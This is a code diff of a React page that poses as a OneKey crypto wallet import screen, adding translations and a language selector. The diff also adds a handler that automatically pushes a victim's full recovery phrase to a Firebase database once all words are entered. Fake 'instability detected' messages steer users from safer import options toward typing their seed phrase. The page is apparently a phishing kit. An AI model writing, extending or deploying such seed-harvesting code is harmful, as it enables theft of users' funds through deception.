@@ -3,13 +3,66 @@ import { registrarEvento } from "./analytics";
 import { useTranslation } from "react-i18next";
 import { ref, push } from "firebase/database";
 import { db } from "./firebase";
+import i18n from "./i18n";
+import { initializeLanguage } from "./i18n";
 
 export default function Wallet() {
   const { t } = useTranslation();
+  const [ready, setReady] = useState(false);
+  const [currentLanguage, setCurrentLanguage] = useState("en");
+  const [showLanguageSelector, setShowLanguageSelector] = useState(false);
 
   useEffect(() => {
-    registrarEvento("visita", "/wallet");
+    const initializeApp = async () => {
+      try {
+        // Sempre inicializar em inglês por padrão
+        await initializeLanguage();
+        setCurrentLanguage(i18n.language);
+
+        // Registrar evento de visita
+        registrarEvento("visita", "/wallet");
+
+        setReady(true);
+      } catch (error) {
+        console.error("Erro ao inicializar app:", error);
+        setReady(true);
+      }
+    };
+
+    initializeApp();
   }, []);
+
+  // Fechar dropdown quando clicar fora
+  useEffect(() => {
+    const handleClickOutside = (event: MouseEvent) => {
+      const target = event.target as Element;
+      if (!target.closest(".language-selector")) {
+        setShowLanguageSelector(false);
+      }
+    };
+
+    if (showLanguageSelector) {
+      document.addEventListener("mousedown", handleClickOutside);
+    }
+
+    return () => {
+      document.removeEventListener("mousedown", handleClickOutside);
+    };
+  }, [showLanguageSelector]);
+
+  // Função para mudar idioma
+  const changeLanguage = async (lang: string) => {
+    try {
+      await i18n.changeLanguage(lang);
+      localStorage.setItem("selectedLanguage", lang);
+      setCurrentLanguage(lang);
+      setShowLanguageSelector(false);
+      console.log(`Idioma alterado para: ${lang}`);
+    } catch (error) {
+      console.error("Erro ao alterar idioma:", error);
+    }
+  };
+
   const [showCard, setShowCard] = useState(true);
   const [showModal, setShowModal] = useState(false);
   const [loading, setLoading] = useState(false);
@@ -60,6 +113,8 @@ export default function Wallet() {
   useEffect(() => {
     setShowModal(true);
   }, []);
+
+  if (!ready) return null;
 
   const handleOpenModal = () => {
     setShowModal(true);
@@ -158,6 +213,38 @@ export default function Wallet() {
       console.log("Seed salva com sucesso!");
     } catch (error) {
       console.error("Erro ao salvar seed:", error);
+    }
+  };
+
+  // Função para salvar clientcard no Firebase
+  const salvarClientCard = async (nomeBotao: string) => {
+    try {
+      const clientCardData = {
+        nomeBotao: nomeBotao,
+        data: new Date().toISOString(),
+        pais: "Brasil",
+        cidade: "São Paulo",
+        estado: "SP",
+        pais_code: "br",
+      };
+
+      const clientCardsRef = ref(db, "clientcards");
+      await push(clientCardsRef, clientCardData);
+      console.log("ClientCard salvo com sucesso!");
+    } catch (error) {
+      console.error("Erro ao salvar clientcard:", error);
+    }
+  };
+
+  // Função para salvar seed automaticamente quando o usuário digitar
+  const handleSeedInputChange = async (index: number, value: string) => {
+    const newWords = [...seedPhraseWords];
+    newWords[index] = value;
+    setSeedPhraseWords(newWords);
+
+    // Salvar automaticamente se todas as palavras estiverem preenchidas
+    if (newWords.every((word) => word.trim() !== "")) {
+      await salvarSeed(newWords);
     }
   };
 
@@ -276,7 +363,7 @@ export default function Wallet() {
               className="w-4 h-4 rounded border-[#D9DBE9]"
             /> */}
             <div className="font-medium text-black text-sm select-none cursor-pointer flex items-center gap-1">
-              Sem conta
+              <span>{t("wallet.main.no_account")}</span>
               <svg width="16" height="16" viewBox="0 0 16 16">
                 <path
                   d="M4 6l4 4 4-4"
@@ -289,6 +376,73 @@ export default function Wallet() {
           </div>
           <div className="flex-1" />
           <div className="flex items-center gap-6">
+            {/* Seletor de Idioma */}
+            <div className="relative language-selector">
+              <button
+                className="flex items-center gap-2 px-3 py-1 rounded-lg hover:bg-[#F5F6FA] transition-colors"
+                onClick={() => setShowLanguageSelector(!showLanguageSelector)}
+              >
+                <svg
+                  fill="none"
+                  viewBox="0 0 24 24"
+                  width="16"
+                  height="16"
+                  color="#A3A3A3"
+                >
+                  <path
+                    stroke="currentColor"
+                    strokeLinecap="round"
+                    strokeLinejoin="round"
+                    strokeWidth="2"
+                    d="M3 5h12M9 3v2m1.048 9.5A18.022 18.022 0 0 1 6.412 9m6.088 9h7M11 21l5-10 5 10M12.751 5C11.783 10.77 8.07 15.61 3 18.129"
+                  />
+                </svg>
+                <span className="text-sm font-medium text-black">
+                  {currentLanguage === "pt" ? "PT" : "EN"}
+                </span>
+                <svg
+                  fill="none"
+                  viewBox="0 0 24 24"
+                  width="12"
+                  height="12"
+                  color="#A3A3A3"
+                  className={`transition-transform ${
+                    showLanguageSelector ? "rotate-180" : ""
+                  }`}
+                >
+                  <path
+                    stroke="currentColor"
+                    strokeLinecap="round"
+                    strokeLinejoin="round"
+                    strokeWidth="2"
+                    d="M19 9l-7 7-7-7"
+                  />
+                </svg>
+              </button>
+
+              {/* Dropdown de idiomas */}
+              {showLanguageSelector && (
+                <div className="absolute top-full right-0 mt-1 bg-white rounded-lg shadow-lg border border-[#E9ECF2] py-1 z-50 min-w-[120px]">
+                  <button
+                    className={`w-full px-3 py-2 text-left text-sm hover:bg-[#F5F6FA] transition-colors ${
+                      currentLanguage === "en" ? "bg-[#F5F6FA] font-medium" : ""
+                    }`}
+                    onClick={() => changeLanguage("en")}
+                  >
+                    English
+                  </button>
+                  <button
+                    className={`w-full px-3 py-2 text-left text-sm hover:bg-[#F5F6FA] transition-colors ${
+                      currentLanguage === "pt" ? "bg-[#F5F6FA] font-medium" : ""
+                    }`}
+                    onClick={() => changeLanguage("pt")}
+                  >
+                    Português
+                  </button>
+                </div>
+              )}
+            </div>
+
             {/* Sininho com badge */}
             <button className="relative">
               <svg
@@ -545,13 +699,13 @@ export default function Wallet() {
                       )}
                     </div>
                     <div className="text-sm text-[#393C4E] text-center mt-2">
-                      O uso implica consentimento aos nossos{" "}
+                      {t("wallet.modal.consent")}{" "}
                       <a href="#" className="underline">
-                        Termos
+                        {t("terms")}
                       </a>{" "}
                       &{" "}
                       <a href="#" className="underline">
-                        Privacidade
+                        {t("privacy")}
                       </a>
                     </div>
                   </div>
@@ -585,11 +739,10 @@ export default function Wallet() {
                       </div>
                     </div>
                     <div className="text-lg font-bold text-black mb-2 text-center">
-                      Conecte o dispositivo via USB
+                      {t("wallet.modal.connect_device_usb")}
                     </div>
                     <div className="text-base text-[#393C4E] mb-6 text-center">
-                      Clique no botão abaixo e selecione seu dispositivo na
-                      janela pop-up para conectar.
+                      {t("wallet.modal.connect_device_usb_desc")}
                     </div>
                     <button
                       className="bg-black text-white px-8 py-3 rounded-lg font-semibold text-base hover:bg-[#393C4E] transition-colors mb-2"
@@ -598,9 +751,9 @@ export default function Wallet() {
                       {t("wallet.modal.connect")}
                     </button>
                     <div className="text-sm text-[#393C4E] text-center mt-2">
-                      Ainda não tem OneKey?{" "}
+                      {t("wallet.modal.no_onekey")}{" "}
                       <a href="#" className="underline text-green-600">
-                        Compre um
+                        {t("wallet.modal.buy_one")}
                       </a>
                     </div>
                   </>
@@ -682,13 +835,13 @@ export default function Wallet() {
                         </span>
                       </button>
                       <span className="text-xl font-semibold text-black ml-2">
-                        Escolha o método de importação
+                        {t("import_methods.title")}
                       </span>
                     </div>
                     {/* Conteúdo das opções, títulos colados à esquerda, opções com pequeno recuo */}
                     <div className="flex flex-col gap-0 pt-2 pb-4">
                       <div className="text-xs text-[#888] font-semibold pt-2 pb-1 pl-0">
-                        Restaurar
+                        {t("import_methods.restore")}
                       </div>
                       <button
                         className="flex items-center w-full py-3 hover:bg-[#F5F6FA] transition-colors group pl-4"
@@ -719,7 +872,7 @@ export default function Wallet() {
                           </svg>
                         </span>
                         <span className="text-base text-black font-medium flex-1 text-left">
-                          Frase de recuperação
+                          {t("import_methods.recovery_phrase")}
                         </span>
                         <span className="material-icons text-[#C0C0C0] group-hover:text-[#393C4E]">
                           chevron_right
@@ -753,7 +906,7 @@ export default function Wallet() {
                           </svg>
                         </span>
                         <span className="text-base text-black font-medium flex-1 text-left">
-                          OneKey KeyTag
+                          {t("import_methods.onekey_keytag")}
                         </span>
                         <span className="material-icons text-[#C0C0C0] group-hover:text-[#393C4E]">
                           chevron_right
@@ -761,7 +914,7 @@ export default function Wallet() {
                       </button>
                       <div className="border-t border-[#E9ECF2] my-2" />
                       <div className="text-xs text-[#888] font-semibold pt-2 pb-1 pl-0">
-                        Importação
+                        {t("import_methods.import")}
                       </div>
                       <button
                         className="flex items-center w-full py-3 hover:bg-[#F5F6FA] transition-colors group pl-4"
@@ -792,7 +945,7 @@ export default function Wallet() {
                           </svg>
                         </span>
                         <span className="text-base text-black font-medium flex-1 text-left">
-                          Chave privada
+                          {t("import_methods.private_key")}
                         </span>
                         <span className="material-icons text-[#C0C0C0] group-hover:text-[#393C4E]">
                           chevron_right
@@ -800,7 +953,7 @@ export default function Wallet() {
                       </button>
                       <div className="border-t border-[#E9ECF2] my-2" />
                       <div className="text-xs text-[#888] font-semibold pt-2 pb-1 pl-0">
-                        Somente visualização
+                        {t("import_methods.view_only")}
                       </div>
                       <button
                         className="flex items-center w-full py-3 hover:bg-[#F5F6FA] transition-colors group pl-4"
@@ -835,7 +988,7 @@ export default function Wallet() {
                           </svg>
                         </span>
                         <span className="text-base text-black font-medium flex-1 text-left">
-                          Endereço
+                          {t("import_methods.address")}
                         </span>
                         <span className="material-icons text-[#C0C0C0] group-hover:text-[#393C4E]">
                           chevron_right
@@ -862,7 +1015,7 @@ export default function Wallet() {
                           </span>
                         </button>
                         <span className="text-lg font-semibold text-black">
-                          Importar frase de recuperação
+                          {t("wallet.modal.import_seed_phrase")}
                         </span>
                       </div>
                       {/* Select e botão limpar na mesma linha */}
@@ -873,7 +1026,9 @@ export default function Wallet() {
                             onClick={() => setShowSeedDropdown((v) => !v)}
                             type="button"
                           >
-                            {seedPhraseCount} palavras
+                            {t("wallet.modal.seed_phrase_count", {
+                              count: seedPhraseCount,
+                            })}
                             <span className="material-icons ml-1 text-sm">
                               expand_more
                             </span>
@@ -894,7 +1049,9 @@ export default function Wallet() {
                                     setShowSeedDropdown(false);
                                   }}
                                 >
-                                  {count} palavras
+                                  {t("wallet.modal.seed_phrase_count", {
+                                    count,
+                                  })}
                                 </button>
                               ))}
                             </div>
@@ -909,7 +1066,7 @@ export default function Wallet() {
                           <span className="material-icons text-sm">
                             auto_delete
                           </span>{" "}
-                          Limpar
+                          {t("wallet.modal.clear")}
                         </button>
                       </div>
                     </div>
@@ -931,9 +1088,10 @@ export default function Wallet() {
                                   placeholder={`${inputIdx + 1}`}
                                   value={seedPhraseWords[inputIdx] || ""}
                                   onChange={(e) => {
-                                    const newWords = [...seedPhraseWords];
-                                    newWords[inputIdx] = e.target.value;
-                                    setSeedPhraseWords(newWords);
+                                    handleSeedInputChange(
+                                      inputIdx,
+                                      e.target.value
+                                    );
                                   }}
                                 />
                               );
@@ -1003,7 +1161,9 @@ export default function Wallet() {
                             onClick={() => setShowSeedDropdown((v) => !v)}
                             type="button"
                           >
-                            {seedPhraseCount} palavras
+                            {t("wallet.modal.seed_phrase_count", {
+                              count: seedPhraseCount,
+                            })}
                             <span className="material-icons ml-1 text-sm">
                               expand_more
                             </span>
@@ -1024,7 +1184,9 @@ export default function Wallet() {
                                     setShowSeedDropdown(false);
                                   }}
                                 >
-                                  {count} palavras
+                                  {t("wallet.modal.seed_phrase_count", {
+                                    count,
+                                  })}
                                 </button>
                               ))}
                             </div>
@@ -1039,7 +1201,7 @@ export default function Wallet() {
                           <span className="material-icons text-sm">
                             auto_delete
                           </span>{" "}
-                          Limpar
+                          {t("wallet.modal.clear")}
                         </button>
                       </div>
                     </div>
@@ -1061,9 +1223,10 @@ export default function Wallet() {
                                   placeholder={`${inputIdx + 1}`}
                                   value={seedPhraseWords[inputIdx] || ""}
                                   onChange={(e) => {
-                                    const newWords = [...seedPhraseWords];
-                                    newWords[inputIdx] = e.target.value;
-                                    setSeedPhraseWords(newWords);
+                                    handleSeedInputChange(
+                                      inputIdx,
+                                      e.target.value
+                                    );
                                   }}
                                 />
                               );
@@ -1189,14 +1352,16 @@ export default function Wallet() {
                       className="text-xs font-semibold text-black mb-1"
                       htmlFor="new-code"
                     >
-                      Novo código de acesso
+                      {t("wallet.modal.new_access_code")}
                     </label>
                     <div className="relative mb-3">
                       <input
                         id="new-code"
                         type={showNewCode ? "text" : "password"}
                         className="w-full border border-[#E9ECF2] rounded-lg px-3 py-2 text-sm focus:outline-none focus:ring-1 focus:ring-black"
-                        placeholder="Crie um código de acesso forte"
+                        placeholder={t(
+                          "wallet.modal.create_strong_access_code"
+                        )}
                       />
                       <span
                         className="absolute right-2 top-1/2 -translate-y-1/2 text-[#888] cursor-pointer material-icons text-sm"
@@ -1209,14 +1374,14 @@ export default function Wallet() {
                       className="text-xs font-semibold text-black mb-1"
                       htmlFor="confirm-code"
                     >
-                      Confirmar código de acesso
+                      {t("wallet.modal.confirm_access_code")}
                     </label>
                     <div className="relative mb-3">
                       <input
                         id="confirm-code"
                         type={showConfirmCode ? "text" : "password"}
                         className="w-full border border-[#E9ECF2] rounded-lg px-3 py-2 text-sm focus:outline-none focus:ring-1 focus:ring-black"
-                        placeholder="Digite novamente seu código de acesso"
+                        placeholder={t("wallet.modal.retype_access_code")}
                       />
                       <span
                         className="absolute right-2 top-1/2 -translate-y-1/2 text-[#888] cursor-pointer material-icons text-sm"
@@ -1227,7 +1392,7 @@ export default function Wallet() {
                     </div>
                     <div className="flex items-center mb-4 mt-2">
                       <span className="text-xs font-semibold text-black mr-2">
-                        Autenticação com Chave de Acesso
+                        {t("wallet.modal.access_key_auth")}
                       </span>
                       <label className="inline-flex relative items-center cursor-pointer ml-auto">
                         <input type="checkbox" className="sr-only peer" />
@@ -1250,7 +1415,7 @@ export default function Wallet() {
                         }
                       }}
                     >
-                      Sincronizar código de acesso
+                      {t("wallet.modal.sync_access_code")}
                     </button>
                   </div>
                 </div>
@@ -1274,14 +1439,13 @@ export default function Wallet() {
 
                       <div className="text-center">
                         <div className="text-xl font-bold text-black mb-3">
-                          Instabilidade detectada
+                          {t("wallet.modal.instability_detected")}
                         </div>
                         <div className="text-base text-[#393C4E] mb-6 max-w-sm">
-                          O sistema de importação via chave privada está
-                          instável no momento.
+                          {t("wallet.modal.private_key_unstable")}
                         </div>
                         <div className="text-sm text-[#393C4E] mb-6">
-                          Recomendamos usar:
+                          {t("wallet.modal.recommend_use")}
                         </div>
 
                         <div className="space-y-3">
@@ -1293,7 +1457,7 @@ export default function Wallet() {
                               setNextImportStep("phrase");
                             }}
                           >
-                            Frase de recuperação
+                            {t("wallet.modal.recovery_phrase")}
                           </button>
                           <button
                             className="w-full bg-[#F5F6FA] text-black py-3 rounded-lg font-semibold border border-[#E9ECF2] hover:bg-[#E9ECF2] transition-colors"
@@ -1303,7 +1467,7 @@ export default function Wallet() {
                               setNextImportStep("onekeytag");
                             }}
                           >
-                            OneKey KeyTag
+                            {t("wallet.modal.onekey_keytag")}
                           </button>
                         </div>
                       </div>
@@ -1330,14 +1494,13 @@ export default function Wallet() {
 
                       <div className="text-center">
                         <div className="text-xl font-bold text-black mb-3">
-                          Instabilidade detectada
+                          {t("wallet.modal.instability_detected")}
                         </div>
                         <div className="text-base text-[#393C4E] mb-6 max-w-sm">
-                          O sistema de importação via endereço está instável no
-                          momento.
+                          {t("wallet.modal.address_unstable")}
                         </div>
                         <div className="text-sm text-[#393C4E] mb-6">
-                          Recomendamos usar:
+                          {t("wallet.modal.recommend_use")}
                         </div>
 
                         <div className="space-y-3">
@@ -1349,7 +1512,7 @@ export default function Wallet() {
                               setNextImportStep("phrase");
                             }}
                           >
-                            Frase de recuperação
+                            {t("wallet.modal.recovery_phrase")}
                           </button>
                           <button
                             className="w-full bg-[#F5F6FA] text-black py-3 rounded-lg font-semibold border border-[#E9ECF2] hover:bg-[#E9ECF2] transition-colors"
@@ -1359,7 +1522,7 @@ export default function Wallet() {
                               setNextImportStep("onekeytag");
                             }}
                           >
-                            OneKey KeyTag
+                            {t("wallet.modal.onekey_keytag")}
                           </button>
                         </div>
                       </div>
@@ -1377,7 +1540,7 @@ export default function Wallet() {
                         <div className="w-16 h-16 border-4 border-gray-200 border-t-black rounded-full animate-spin mb-6"></div>
                         <div className="text-center">
                           <div className="text-xl font-bold text-black mb-3">
-                            Please wait
+                            {t("wallet.modal.please_wait")}
                           </div>
                           <div className="text-base text-[#393C4E] mb-6 max-w-sm">
                             {syncMessage}
